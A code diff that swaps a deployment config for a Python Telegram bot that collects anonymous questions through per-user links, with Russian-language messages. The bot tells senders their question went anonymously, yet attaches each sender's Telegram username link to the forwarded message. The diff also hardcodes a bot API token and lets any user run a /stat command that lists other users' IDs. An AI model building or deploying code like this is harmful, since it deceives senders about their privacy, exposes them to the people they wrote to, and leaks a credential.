@@ -1,5 +1,163 @@
-[build]
-builder = "NIXPACKS"
+import string
+import random
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
+from datetime import datetime, date
 
-[deploy]
-startCommand = "hypercorn main:app --bind \"[::]:$PORT\""
+# In-memory storage for user tokens and mapping
+user_tokens = {}  # user_id: token
+token_to_user = {}  # token: user_id
+pending_questions = {}  # chat_id: token (for anonymous users)
+
+BOT_USERNAME = "Anonimnieasks_bot"  # e.g., anonaskbot
+
+def generate_token(length=6):
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id not in user_tokens:
+        token = generate_token()
+        user_tokens[user_id] = token
+        token_to_user[token] = user_id
+    else:
+        token = user_tokens[user_id]
+    link = f"https://t.me/{BOT_USERNAME}?start={token}"
+    await update.message.reply_text(
+        f"Ваша уникальная ссылка для получения анонимных сообщений:\n{link}\n"
+        "Отправьте её друзьям или разместите в профиле!:3"
+    )
+
+async def handle_token_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    args = context.args
+    token = None
+    if args:
+        token = args[0]
+    else:
+        # Try to extract token from the message text (e.g., "/start <token>")
+        if update.message and update.message.text:
+            parts = update.message.text.strip().split()
+            if len(parts) > 1:
+                token = parts[1]
+    if token:
+        if token in token_to_user:
+            pending_questions[update.effective_chat.id] = token
+            await update.message.reply_text(
+                "Напишите анонимный вопрос, который будет отправлен пользователю."
+            )
+        else:
+            await update.message.reply_text("Ссылка недействительна.")
+    else:
+        await start(update, context)
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id
+    if chat_id in pending_questions:
+        token = pending_questions.pop(chat_id)
+        target_user_id = token_to_user.get(token)
+        if target_user_id:
+            sender = update.effective_user
+            sender_link = f"https://t.me/{sender.username}" if sender.username else "Пользователь скрыл свой username"
+            await context.bot.send_message(
+                chat_id=target_user_id,
+                text=(
+                    f"Вам пришёл вопрос:\n\n{update.message.text}\n\n"
+                    f"Отправитель: {sender_link}"
+                )
+            )
+            await update.message.reply_text("Ваш вопрос отправлен анонимно!")
+        else:
+            await update.message.reply_text("Ошибка: пользователь не найден.")
+    else:
+        await update.message.reply_text(
+            "Используйте /start чтобы получить свою уникальную ссылку."
+        )
+
+# Statistics storage
+stats = {
+    "total_users": set(),
+    "today_users": set(),
+    "user_join_times": {},  # user_id: datetime
+    "total_messages": 0,
+    "today_messages": 0,
+    "message_times": [],  # list of (user_id, datetime)
+}
+
+def reset_today_stats():
+    today = date.today()
+    # Remove users who joined not today
+    stats["today_users"] = {uid for uid in stats["today_users"]
+                            if stats["user_join_times"].get(uid, today) == today}
+    # Count messages sent today
+    stats["today_messages"] = sum(1 for _, t in stats["message_times"] if t.date() == today)
+
+async def handle_token_start_with_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    now = datetime.now()
+    today = date.today()
+    if user_id not in user_tokens:
+        token = generate_token()
+        user_tokens[user_id] = token
+        token_to_user[token] = user_id
+    else:
+        token = user_tokens[user_id]
+    # Stats update
+    if user_id not in stats["total_users"]:
+        stats["total_users"].add(user_id)
+        stats["user_join_times"][user_id] = now.date()
+    if stats["user_join_times"].get(user_id) == today:
+        stats["today_users"].add(user_id)
+    else:
+        stats["user_join_times"][user_id] = today
+        stats["today_users"].add(user_id)
+    await start(update, context)
+
+async def handle_message_with_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    now = datetime.now()
+    stats["total_messages"] += 1
+    stats["message_times"].append((update.effective_user.id, now))
+    if now.date() == date.today():
+        stats["today_messages"] += 1
+    await handle_message(update, context)
+
+async def stat_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    reset_today_stats()
+    today = date.today()
+    # Если пользователь только что зашел по ссылке (через /start <token>), засчитываем его
+    user_id = update.effective_user.id
+    if user_id not in stats["total_users"]:
+        stats["total_users"].add(user_id)
+        stats["user_join_times"][user_id] = today
+    if stats["user_join_times"].get(user_id) == today:
+        stats["today_users"].add(user_id)
+    today_users = [str(uid) for uid in stats["today_users"] if stats["user_join_times"].get(uid) == today]
+    text = (
+        f"Статистика:\n"
+        f"Пользователей перешло сегодня: {len(today_users)}\n"
+        f"Пользователей за всё время: {len(stats['total_users'])}\n"
+        f"ID пользователей сегодня: {', '.join(today_users) if today_users else 'Нет'}\n"
+        f"Сообщений сегодня: {stats['today_messages']}\n"
+        f"Сообщений за всё время: {stats['total_messages']}"
+    )
+    await update.message.reply_text(text)
+
+def main():
+    TOKEN = "8213134659:AAERU66HbRztn5irGdvG-hBQDTFHTpY1Z0U"
+    app = ApplicationBuilder().token(TOKEN).build()
+    # Remove the default /start handler if present
+    for handler in list(app.handlers.get(0, [])):
+        if isinstance(handler, CommandHandler) and handler.command == ["start"]:
+            app.handlers[0].remove(handler)
+
+    # Add a handler for /start with token argument (for anonymous questions)
+    app.add_handler(CommandHandler("start", handle_token_start))
+    # Use the stats-enabled handlers
+    app.add_handler(CommandHandler("start", handle_token_start_with_stats))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message_with_stats))
+    app.add_handler(CommandHandler("stat", stat_command))
+
+    print("Bot started..,,,,")
+    app.run_polling()
+
+if __name__ == "__main__":
+    main()
